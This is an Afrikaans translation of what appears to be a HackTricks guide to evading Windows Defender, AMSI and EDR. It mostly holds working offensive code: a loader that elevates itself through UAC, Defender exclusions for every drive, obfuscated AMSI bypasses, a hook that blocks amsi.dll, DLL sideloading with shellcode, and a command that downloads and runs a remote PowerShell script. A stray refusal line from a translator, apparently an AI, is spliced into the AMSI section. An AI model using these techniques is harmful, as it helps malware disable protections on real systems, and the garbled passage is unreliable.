# Antivirus (AV)-omseiling

{{#include ../banners/hacktricks-training.md}}

**Hierdie bladsy is oorspronklik geskryf deur** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): ’n Hulpmiddel om te keer dat Windows Defender werk.
- [no-defender](https://github.com/es3n1n/no-defender): ’n Hulpmiddel om te keer dat Windows Defender werk deur ’n ander AV na te maak.
- [Deaktiveer Defender as jy admin is](basic-powershell-for-pentesters/README.md)

### Installer-styl UAC-lokmiddel voordat daar met Defender gepeuter word

Openbare loaders wat hulle as game cheats voordoen, word dikwels as ongetekende Node.js/Nexe-installers versprei. Hulle **vra eers die gebruiker om verhoogde regte**, en skakel Defender eers daarna buite werking. Die proses is eenvoudig:

1. Toets vir ’n administratiewe konteks met `net session`. Die opdrag slaag slegs wanneer die oproeper adminregte het, dus dui ’n mislukking daarop dat die loader as ’n standaardgebruiker loop.
2. Herbegin homself onmiddellik met die `RunAs`-werkwoord om die verwagte UAC-toestemmingsprompt te aktiveer, terwyl die oorspronklike opdragreël behoue bly.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Slagoffers glo reeds dat hulle “gekraakte” sagteware installeer, en aanvaar dus gewoonlik die prompt, wat die malware die regte gee wat dit nodig het om Defender se beleid te verander.<sup>[[26]](#references)</sup>

### Omvattende `MpPreference`-uitsluitings vir elke dryfletter

Sodra dit verhoogde regte het, maksimeer GachiLoader-styl-kettings Defender se blinde kolle in plaas daarvan om die diens heeltemal te deaktiveer. Die loader beëindig eers die GUI-waghond (`taskkill /F /IM SecHealthUI.exe`) en voeg dan **uiters breë uitsluitings** by sodat elke gebruikersprofiel, stelselgids en verwyderbare skyf nie geskandeer kan word nie:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Key waarnemings:

- Die lus loop deur elke gemonteerde lêerstelsel (D:\, E:\, USB-stokkies, ens.), dus word **enige toekomstige payload wat enige plek op die skyf neergesit word, geïgnoreer**.
- Die uitsluiting van die `.sys`-uitbreiding is voorsorggerig—aanvallers behou die opsie om later ongetekende drivers te laai sonder om Defender weer aan te raak.
- Alle veranderinge word onder `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` aangebring, sodat latere stadiums kan bevestig dat die uitsluitings voortduur of dit kan uitbrei sonder om UAC weer te aktiveer.

Omdat geen Defender-diens gestop word nie, rapporteer naïewe gesondheidstoetse steeds “antivirus aktief”, al raak intydse inspeksie nooit daardie paaie nie.<sup>[[26]](#references)</sup>

## **AV-ontduikingsmetodologie**

AV’s gebruik tans verskillende metodes om te bepaal of ’n lêer kwaadwillig is: statiese opsporing, dinamiese ontleding en, vir die meer gevorderde EDR’s, gedragsontleding.

### **Statiese opsporing**

Statiese opsporing word bewerkstellig deur bekende kwaadwillige stringe of byte-skikkings in ’n binary of script te merk, en ook deur inligting uit die lêer self te onttrek (bv. lêerbeskrywing, maatskappynaam, digitale handtekeninge, ikoon, kontrolesom, ens.). Dit beteken dat jy makliker gevang kan word as jy bekende publieke tools gebruik, aangesien hulle waarskynlik ontleed en as kwaadwillig gemerk is. Daar is ’n paar maniere om hierdie soort opsporing te omseil:

- **Encryption**

As jy die binary enkripteer, sal AV jou program nie kan opspoor nie, maar jy sal ’n soort loader nodig hê om die program te dekripteer en in die geheue uit te voer.

- **Obfuscation**

Soms hoef jy net ’n paar stringe in jou binary of script te verander om dit by AV verby te kry, maar dit kan tydrowend wees, afhangend van wat jy probeer obfuskeer.

- **Custom tooling**

As jy jou eie tools ontwikkel, sal daar geen bekende slegte signatures wees nie, maar dit verg baie tyd en moeite.

> [!TIP]
> ’n Goeie manier om teen Windows Defender se statiese opsporing te toets, is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dit verdeel basies die lêer in verskeie segmente en laat Defender dan elkeen afsonderlik skandeer. So kan dit jou presies vertel watter gemerkte stringe of bytes in jou binary voorkom.

Ek beveel sterk aan dat jy hierdie [YouTube-snitlys](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) oor praktiese AV Evasion bekyk.

### **Dinamiese ontleding**

Dinamiese ontleding is wanneer die AV jou binary in ’n sandbox laat loop en kyk vir kwaadwillige aktiwiteit (bv. pogings om jou blaaier se wagwoorde te dekripteer en lees, ’n minidump van LSASS te maak, ens.). Dit kan ’n bietjie moeiliker wees om mee te werk, maar hier is ’n paar dinge wat jy kan doen om sandboxes te ontduik.

- **Slaap voor uitvoering** Afhangend van hoe dit geïmplementeer is, kan dit ’n goeie manier wees om AV se dinamiese ontleding te omseil. AV’s het baie min tyd om lêers te skandeer sodat hulle nie die gebruiker se werkvloei onderbreek nie; lang slaaptye kan dus die ontleding van binaries ontwrig. Die probleem is dat baie AV-sandboxes die slaaptyd eenvoudig kan oorslaan, afhangend van hoe dit geïmplementeer is.
- **Kontroleer die masjien se hulpbronne** Sandboxes het gewoonlik baie min hulpbronne beskikbaar (bv. < 2GB RAM); anders kan hulle die gebruiker se masjien vertraag. Jy kan hier ook baie kreatief raak, byvoorbeeld deur die CPU-temperatuur of selfs die waaierspoed na te gaan—nie alles sal in die sandbox geïmplementeer wees nie.
- **Masjienspesifieke kontroles** As jy ’n gebruiker wil teiken wie se werkstasie aan die "contoso.local"-domein gekoppel is, kan jy die rekenaar se domein nagaan om te sien of dit ooreenstem met die een wat jy gespesifiseer het. As dit nie ooreenstem nie, kan jy jou program laat afsluit.

Dit blyk dat Microsoft Defender se sandbox-rekenaarnaam HAL9TH is. Jy kan dus jou malware se rekenaarnaam nagaan voordat dit ontplof. As die naam HAL9TH is, beteken dit dat jy binne Defender se sandbox is, en kan jy jou program laat afsluit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>bron: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Nog ’n paar baie goeie wenke van [@mgeeky](https://twitter.com/mariuszbit) om sandboxes te ontduik

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev-kanaal</p></figcaption></figure>

Soos ons vroeër in hierdie plasing gesê het, sal **publieke tools** uiteindelik **opgespoor word**. Jy moet jouself dus die volgende afvra:

As jy byvoorbeeld LSASS wil dump, **moet jy regtig mimikatz gebruik**? Of kan jy ’n ander, minder bekende projek gebruik wat ook LSASS dump?

Laasgenoemde is waarskynlik die regte antwoord. As ons mimikatz as voorbeeld neem, is dit waarskynlik een van die malware-programme—indien nie dié een nie—wat die meeste deur AV’s en EDR’s gemerk word. Die projek self is baie cool, maar dit is ook ’n nagmerrie om daarmee te werk om AV’s te omseil. Soek dus bloot alternatiewe vir wat jy probeer bereik.

> [!TIP]
> Wanneer jy jou payloads vir ontduiking wysig, maak seker dat jy **outomatiese voorbeeldindiening** in Defender afskakel, en asseblief, ernstig, **MOENIE NA VIRUSTOTAL OPlaai NIE** as jy op die lang duur ontduiking wil bewerkstellig. As jy wil nagaan of ’n spesifieke AV jou payload opspoor, installeer dit op ’n VM, probeer om outomatiese voorbeeldindiening af te skakel, en toets dit daar totdat jy tevrede is met die resultaat.

## EXEs vs DLLs

Waar moontlik, **prioritiseer altyd die gebruik van DLLs vir ontduiking**. Volgens my ervaring word DLL-lêers gewoonlik **baie minder opgespoor** en ontleed. Dit is dus ’n eenvoudige truuk om in sommige gevalle opsporing te vermy (as jou payload natuurlik op ’n manier as ’n DLL kan loop).

Soos ons in hierdie beeld kan sien, het ’n DLL-payload van Havoc ’n opsporingsyfer van 4/26 op antiscan.me, terwyl die EXE-payload ’n opsporingsyfer van 7/26 het.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me-vergelyking van ’n gewone Havoc EXE-payload met ’n gewone Havoc DLL</p></figcaption></figure>

Nou wys ons ’n paar truuks wat jy met DLL-lêers kan gebruik om baie meer onopvallend te wees.

## DLL Sideloading & Proxying

**DLL Sideloading** benut die DLL-soekvolgorde wat die loader gebruik deur die slagofferprogram en kwaadwillige payload(s) langs mekaar te plaas.

Jy kan programme vind wat kwesbaar is vir DLL Sideloading deur [Siofra](https://github.com/Cybereason/siofra) en die volgende powershell-script te gebruik:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Hierdie opdrag sal die lys programme in "C:\Program Files\\" uitvoer wat vatbaar is vir DLL hijacking, asook die DLL-lêers wat hulle probeer laai.

Ek beveel sterk aan dat jy **self programme verken wat met DLL hijacking/sideloading vatbaar is**. Hierdie tegniek is redelik stealthy wanneer dit behoorlik uitgevoer word, maar as jy publiek bekende programme gebruik wat DLL sideloading ondersteun, kan jy maklik uitgevang word.

Deur bloot ’n kwaadwillige DLL te plaas met die naam van ’n DLL wat ’n program verwag om te laai, sal jou payload nie laai nie, aangesien die program spesifieke funksies binne daardie DLL verwag. Om hierdie probleem op te los, gebruik ons ’n ander tegniek genaamd **DLL Proxying/Forwarding**.

**DLL Proxying** stuur die oproepe wat ’n program maak van die proxy (en kwaadwillige) DLL na die oorspronklike DLL. Só behou dit die program se funksionaliteit en kan dit jou payload uitvoer.

Ek gaan die [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy)-projek van [@flangvik](https://twitter.com/Flangvik/) gebruik.

Dit is die stappe wat ek gevolg het:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Die laaste opdrag sal vir ons 2 lêers gee: ’n DLL-bronkodesjabloon en die oorspronklike hernoemde DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Hier is die resultate:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Ons shellcode (geënkodeer met [SGN](https://github.com/EgeBalci/sgn)) en die proxy DLL het albei ’n Detection rate van 0/26 op [antiscan.me](https://antiscan.me)! Ek sou dit ’n sukses noem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ek **beveel sterk aan** dat jy na [S3cur3Th1sSh1t se twitch VOD](https://www.twitch.tv/videos/1644171543) oor DLL Sideloading kyk, asook [ippsec se video](https://www.youtube.com/watch?v=3eROsG_WNpE), om meer te wete te kom oor wat ons in meer diepte bespreek het.

### Misbruik van Forwarded Exports (ForwardSideLoading)

Windows PE-modules kan funksies uitvoer wat eintlik “forwarders” is: in plaas daarvan om na kode te wys, bevat die uitvoerinskrywing ’n ASCII-string in die vorm `TargetDll.TargetFunc`. Wanneer ’n caller die uitvoer resolve, sal die Windows loader:

- `TargetDll` laai as dit nog nie gelaai is nie
- `TargetFunc` daaruit resolve

Belangrike gedrag om te verstaan:
- As `TargetDll` ’n KnownDLL is, word dit uit die beskermde KnownDLLs-naamruimte verskaf (bv. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- As `TargetDll` nie ’n KnownDLL is nie, word die normale DLL-soekvolgorde gebruik, wat die gids insluit van die module wat die forward-resolving uitvoer.

Dit maak ’n indirekte sideloading-primitive moontlik: vind ’n getekende DLL wat ’n funksie uitvoer wat na ’n module met ’n naam wat nie ’n KnownDLL is nie, forward, en plaas daardie getekende DLL saam met ’n aanvaller-beheerde DLL wat presies die naam van die forwarded teikenmodule het. Wanneer die forwarded uitvoer opgeroep word, resolve die loader die forward en laai jou DLL uit dieselfde gids, wat jou DllMain uitvoer.<sup>[[13]](#references)</sup>

Voorbeeld waargeneem op Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` is nie ’n KnownDLL nie, daarom word dit volgens die normale soekvolgorde opgelos.

PoC (kopieer-en-plak):
1) Kopieer die getekende stelsel-DLL na ’n skryfbare vouer
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Plaas ’n kwaadwillige `NCRYPTPROV.dll` in dieselfde vouer. ’n Minimale `DllMain` is genoeg om code execution te kry; jy hoef nie die forwarded function te implementeer om `DllMain` te aktiveer nie.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Aktiveer die forward met ’n signed LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Waargenome gedrag:
- rundll32 (signed) laai die side-by-side `keyiso.dll` (signed)
- Wanneer `KeyIsoSetAuditingInterface` opgelos word, volg die laaier die forward na `NCRYPTPROV.SetAuditingInterface`
- Die laaier laai dan `NCRYPTPROV.dll` vanaf `C:\test` en voer sy `DllMain` uit
- As `SetAuditingInterface` nie geïmplementeer is nie, kry jy eers ’n "missing API"-fout nadat `DllMain` reeds uitgevoer is

Wenke vir opsporing:
- Fokus op forwarded exports waar die teikenmodule nie ’n KnownDLL is nie. KnownDLLs word gelys onder `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Jy kan forwarded exports opsom met nutsgoed soos:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Sien die Windows 11-forwarder-inventaris om kandidate te soek: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Idees vir opsporing/verdediging:
- Monitor LOLBins (bv. rundll32.exe) wat getekende DLL's vanaf nie-stelselpaadjies laai, gevolg deur die laai van nie-KnownDLLs met dieselfde basisnaam vanaf daardie gids
- Stel waarskuwings in vir proses-/modulekettings soos: `rundll32.exe` → nie-stelsel-`keyiso.dll` → `NCRYPTPROV.dll` onder paadjies waartoe gebruikers skryftoegang het
- Pas kode-integriteitsbeleide af (WDAC/AppLocker) en verbied skryf- en uitvoertoegang in toepassingsgidse

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is 'n payload-gereedskapstel om EDR's te omseil deur opgeskorte prosesse, direkte syscalls en alternatiewe uitvoermetodes te gebruik`

Jy kan Freeze gebruik om jou shellcode op 'n sluipende manier te laai en uit te voer.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ontduiking is net ’n kat-en-muis-speletjie: wat vandag werk, kan môre opgespoor word. Moet dus nooit op net een hulpmiddel staatmaak nie; probeer, indien moontlik, verskeie ontduikingstegnieke kombineer.

## Direkte/Indirekte Syscalls en SSN-bepaling (SysWhispers4)

EDR’s plaas dikwels **inline hooks in user mode** op `ntdll.dll`-syscall-stubs. Om dié hooks te omseil, kan jy **direkte** of **indirekte** syscall-stubs genereer wat die korrekte **SSN** (System Service Number) laai en na kernel mode oorskakel sonder om die gehaakte uitvoerinskryfpunt uit te voer.<sup>[[32]](#references)</sup>

**Oproepopsies:**
- **Direct (embedded)**: voeg ’n `syscall`/`sysenter`/`SVC #0`-instruksie by die gegenereerde stub (geen toegang tot ’n `ntdll`-uitvoer nie).
- **Indirect**: spring na ’n bestaande `syscall`-gadget binne `ntdll` sodat dit lyk asof die kernel-oorgang van `ntdll` af kom (nuttig vir heuristiese ontduiking); **randomized indirect** kies per oproep ’n gadget uit ’n poel.
- **Egg-hunt**: vermy die inbedding van die statiese `0F 05`-opcode-volgorde op skyf; vind ’n syscall-volgorde tydens looptyd.

**Hook-bestande strategieë vir SSN-bepaling:**
- **FreshyCalls (VA sort)**: lei SSN’s af deur syscall-stubs volgens virtuele adres te sorteer, eerder as om die stub-grepe te lees.
- **SyscallsFromDisk**: koppel ’n skoon `\KnownDlls\ntdll.dll`, lees SSN’s uit sy `.text` en ontkoppel dit dan (omseil alle hooks in geheue).
- **RecycledGate**: kombineer SSN-afleiding deur VA-sortering met opcode-validasie wanneer ’n stub skoon is; val terug op VA-afleiding as dit gehaak is.
- **HW Breakpoint**: stel DR0 op die `syscall`-instruksie en gebruik ’n VEH om die SSN tydens looptyd uit `EAX` vas te lê, sonder om gehaakte grepe te ontleed.

Voorbeeld van SysWhispers4-gebruik:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI is geskep om "[lêerlose malware](https://en.wikipedia.org/wiki/Fileless_malware)" te voorkom. Aanvanklik kon AV's slegs **lêers op skyf** skandeer, so as jy op een of ander manier payloads **direk in die geheue** kon uitvoer, kon die AV niks doen om dit te voorkom nie, omdat dit nie genoeg sigbaarheid gehad het nie.

Die AMSI-funksie is in hierdie Windows-komponente geïntegreer.

- User Account Control, of UAC (verhoging van EXE, COM, MSI of ActiveX-installasie)
- PowerShell (skripte, interaktiewe gebruik en dinamiese kode-evaluering)
- Windows Script Host (wscript.exe en cscript.exe)
- JavaScript en VBScript
- Office VBA-makro's

Dit stel antivirusoplossings in staat om skripgedrag te ondersoek deur skripinhoud bloot te stel in 'n vorm wat ontekripteer en nie-geobfuskeer is.

As jy `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` uitvoer, sal dit die volgende waarskuwing in Windows Defender veroorsaak.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Let op hoe dit `amsi:` en daarna die pad na die uitvoerbare lêer waaruit die skrip uitgevoer is, byvoeg; in hierdie geval, powershell.exe

Ons het geen lêer na die skyf geskryf nie, maar is steeds in die geheue betrap weens AMSI.

Verder, vanaf **.NET 4.8**, word C#-kode ook deur AMSI verwerk. Dit beïnvloed selfs `Assembly.Load(byte[])` vir die laai van uitvoering in die geheue. Daarom word die gebruik van laer weergawes van .NET (soos 4.7.2 of ouer) vir uitvoering in die geheue aanbeveel as jy AMSI wil ontduik.

Daar is ’n paar maniere om AMSI te omseil:

- **Obfuskering**

Aangesien AMSI hoofsaaklik met statiese opsporing werk, kan die wysiging van die skripte wat jy probeer laai dus ’n goeie manier wees om opsporing te ontduik.

AMSI kan skripte egter deobfuskereer, selfs al het hulle verskeie lae, so obfuskering kan ’n swak opsie wees, afhangend van hoe dit gedoen word. Dit maak ontduiking nie heeltemal eenvoudig nie. Soms hoef jy egter net ’n paar veranderlikename te verander en dan is jy reg; dit hang dus af van hoe sterk iets gemerk is.

- **AMSI Bypass**

Aangesien AMSI geïmplementeer word deur ’n DLL in die powershell-proses te laai (ook cscript.exe, wscript.exe, ens.), is dit maklik om daarmee te peuter, selfs wanneer jy as ’n gebruiker sonder verhoogde voorregte loop. Weens hierdie fout in die implementering van AMSI het navorsers verskeie maniere gevind om AMSI-skandering te ontduik.

**Dwing ’n fout af**

As jy AMSI-inisialisering laat misluk (amsiInitFailed), sal geen skandering vir die huidige proses begin word nie. Dit is oorspronklik deur [Matt Graeber](https://twitter.com/mattifestation) bekend gemaak, waarna Microsoft ’n signature ontwikkel het om wydverspreide gebruik te voorkom.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Al wat nodig was, was een reël PowerShell-kode om AMSI onbruikbaar te maak vir die huidige PowerShell-proses. Hierdie reël is natuurlik deur AMSI self gemerk, dus is ’n wysiging nodig om hierdie tegniek te gebruik.

Hier is ’n aangepaste AMSI-bypass wat ek van hierdie [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) geneem het.

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Hou in gedagte dat dit waarskynlik gevlag sal word sodra hierdie plasing verskyn, dus moet jy geen kode publiseer as jou plan is om onopgemerk te bly nie.

**Memory Patching**

Hierdie tegniek is aanvanklik deur [@RastaMouse](https://twitter.com/_RastaMouse/) ontdek. Dit behels dat die adres van die "AmsiScanBuffer"-funksie in amsi.dll (wat verantwoordelik is vir die skandering van die gebruiker se invoer) gevind word en dat dit met instruksies oorskryf word om die kode vir E_INVALIDARG terug te gee. Sodoende gee die resultaat van die werklike skandering 0 terug, wat as ’n skoon resultaat geïnterpreteer word.

> [!TIP]
> Lees asseblief [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) vir ’n meer gedetailleerde verduideliking.

Daar is ook baie ander tegnieke om AMSI met powershell te omseil. Kyk na [**hierdie bladsy**](basic-powershell-for-pentesters/index.html#amsi-bypass) en [**hierdie repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) om meer daaroor te wete te kom.

### Blokkeer AMSI deur te verhoed dat amsi.dll laai (LdrLoadDll hook)

AMSI word eers geïnisialiseer nadat `amsi.dll` in die huidige proses gelaai is. ’n Robuuste, taal-onafhanklike omseiling is om ’n user-mode hook op `ntdll!LdrLoadDll` te plaas wat ’n fout teruggee wanneer die aangevraagde module `amsi.dll` is. Gevolglik word AMSI nooit gelaai nie en vind geen skanderings vir daardie proses plaas nie.<sup>[[23]](#references)</sup>

Uiteensetting van die implementering (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Ek kan nie instruksies vertaal wat help om AMSI- en AV/EDR-beskerming te omseil of te deaktiveer nie. Ek kan wel help om die teks te omskep in ’n nie-operasionele, verdedigingsgerigte weergawe.

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell logging is ’n kenmerk waarmee jy alle PowerShell-opdragte wat op ’n stelsel uitgevoer word, kan log. Dit kan nuttig wees vir ouditering en probleemoplossing, maar dit kan ook ’n **probleem wees vir aanvallers wat opsporing wil vermy**.

Om PowerShell logging te omseil, kan jy die volgende tegnieke gebruik:

- **Deaktiveer PowerShell Transcription en Module Logging**: Jy kan ’n nutsding soos [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) hiervoor gebruik.
- **Gebruik PowerShell weergawe 2**: As jy PowerShell weergawe 2 gebruik, sal AMSI nie gelaai word nie, sodat jy jou skripte kan uitvoer sonder dat AMSI dit skandeer. Jy kan dit so doen: `powershell.exe -version 2`
- **Gebruik ’n unmanaged PowerShell-sessie**: Gebruik [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) om PowerShell te huisves sonder om `powershell.exe` te begin (die benadering wat Cobalt Strike se `powerpick` gebruik). Dit ontduik kontroles wat spesifiek aan die `powershell.exe`-proses gekoppel is, maar deaktiveer nie vanself AMSI, Script Block Logging of elke ander PowerShell-verdediging nie; dekking hang af van die runtime en host-implementering.


## Obfuscation

> [!TIP]
> Verskeie obfuscation-tegnieke maak staat op die enkripsie van data, wat die entropie van die binêre lêer verhoog en dit vir AVs en EDRs makliker maak om op te spoor. Wees versigtig hiermee en pas enkripsie dalk net toe op spesifieke dele van jou kode wat sensitief is of versteek moet word.

### Deobfuscating van ConfuserEx-beskermde .NET-binäres

Wanneer malware ontleed word wat ConfuserEx 2 (of kommersiële forks) gebruik, kom jy dikwels verskeie lae beskerming teë wat decompilers en sandboxes blokkeer. Die werkvloei hieronder **herstel betroubaar ’n byna oorspronklike IL** wat daarna in nutsmiddels soos dnSpy of ILSpy na C# gedecompileer kan word.<sup>[[10]](#references)</sup>

1.  Verwydering van anti-tampering – ConfuserEx enkripteer elke *method body* en dekripteer dit binne die *module* se statiese constructor (`<Module>.cctor`). Dit verander ook die PE checksum sodat enige wysiging die binêre lêer sal laat crash. Gebruik **AntiTamperKiller** om die geënkripteerde metadata-tabelle op te spoor, die XOR-sleutels te herwin en ’n skoon assembly te herskryf:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Die uitvoer bevat die 6 anti-tamper-parameters (`key0-key3`, `nameHash`, `internKey`) wat nuttig kan wees wanneer jy jou eie unpacker bou.

2.  Simbool-/beheer-vloei-herwinning – voer die *skoon* lêer aan **de4dot-cex** (’n ConfuserEx-bewuste fork van de4dot).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Vlae:
     • `-p crx` – kies die ConfuserEx 2-profiel
     • de4dot sal control-flow flattening ongedaan maak, oorspronklike namespaces, klasse en veranderlikename herstel, en konstantestrings dekripteer.

3.  Proxy-call-verwydering – ConfuserEx vervang direkte metode-oproepe met liggewig-omhulsels (ook bekend as *proxy calls*) om dekompilering verder te bemoeilik. Verwyder hulle met **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Ná hierdie stap behoort jy normale .NET API's soos `Convert.FromBase64String` of `AES.Create()` te sien in plaas van ondeursigtige wrapper-funksies (`Class8.smethod_10`, …).

4.  Handmatige opruiming – voer die resulterende binary onder dnSpy uit en soek na groot Base64-blobs of gebruik van `RijndaelManaged`/`TripleDESCryptoServiceProvider` om die *werklike* payload op te spoor.  Die malware stoor dit dikwels as 'n TLV-encoded byte array wat binne `<Module>.byte_0` geïnitialiseer word.

Die ketting herstel die uitvoeringsvloei **sonder** dat die kwaadwillige sample uitgevoer hoef te word – nuttig wanneer jy op 'n offline werkstasie werk.

> 🛈  ConfuserEx genereer 'n pasgemaakte attribuut genaamd `ConfusedByAttribute` wat as 'n IOC gebruik kan word om samples outomaties te triageer.

#### Eenreël-opdrag
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C#-obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Die doel van hierdie projek is om ’n oopbron-fork van die [LLVM](http://www.llvm.org/)-samestellingsuite te bied wat verbeterde sagtewaresekuriteit deur [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) en peuterbeskerming kan bied.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstreer hoe die `C++11/14`-taal gebruik kan word om tydens samestelling geobfuskeerde code te genereer sonder eksterne nutsgoed of wysigings aan die compiler.
